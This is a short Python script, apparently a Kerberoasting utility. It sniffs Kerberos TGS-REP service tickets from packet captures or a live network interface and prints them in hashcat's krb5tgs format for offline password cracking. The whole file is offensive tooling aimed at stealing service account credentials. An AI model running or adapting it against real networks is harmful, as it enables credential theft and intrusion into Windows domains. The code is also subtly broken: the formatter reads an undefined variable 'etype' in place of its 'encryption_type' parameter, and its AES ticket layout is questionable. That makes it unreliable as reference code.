import pyshark

def hashcat_format_krb5tgs(encryption_type, realm, spn, ciphertext):
    if etype == '17' or etype == '18':
        checksum_start = len(ciphertext) - 24
        checksum = ciphertext[checksum_start:]
        cipher = ciphertext[:checksum_start]
    elif etype == '23':
        checksum = ciphertext[:32]
        cipher = ciphertext[32:]

    return f'$krb5tgs${etype}$*UNKNOWN_USERNAME${realm}${spn}@{realm}*${checksum}${cipher}'

def capture_krb5tgs_tickets_from_file(filename):
    print(f'Reading kerberos tickets from file {filename}')
    cap = pyshark.FileCapture(filename, display_filter='kerberos')
    for packet in cap:
        if 'Kerberos' in packet:
            if packet.kerberos.msg_type == '13':
                etype = packet.kerberos.etype
                realm = packet.kerberos.realm
                spn_part_1 = packet.kerberos.snamestring.all_fields[0].get_default_value()
                spn_part_2 = packet.kerberos.snamestring.all_fields[1].get_default_value()
                spn = f'{spn_part_1}/{spn_part_2}'
                ciphertext = packet.kerberos.cipher.replace(':', '').upper()
                print(hashcat_format_krb5tgs(etype, realm, spn, ciphertext))

def capture_krb5tgs_tickets_live(interface):
    print(f'Starting live capture on {interface}')
    cap = pyshark.LiveCapture(interface=interface, display_filter='kerberos')
    for packet in cap.sniff_continuously():
        if 'Kerberos' in packet:
            if packet.kerberos.msg_type == '13':
                etype = packet.kerberos.etype
                realm = packet.kerberos.realm
                spn_part_1 = packet.kerberos.snamestring.all_fields[0].get_default_value()
                spn_part_2 = packet.kerberos.snamestring.all_fields[1].get_default_value()
                spn = f'{spn_part_1}/{spn_part_2}'
                ciphertext = packet.kerberos.cipher.replace(':', '').upper()
                print(hashcat_format_krb5tgs(etype, realm, spn, ciphertext))

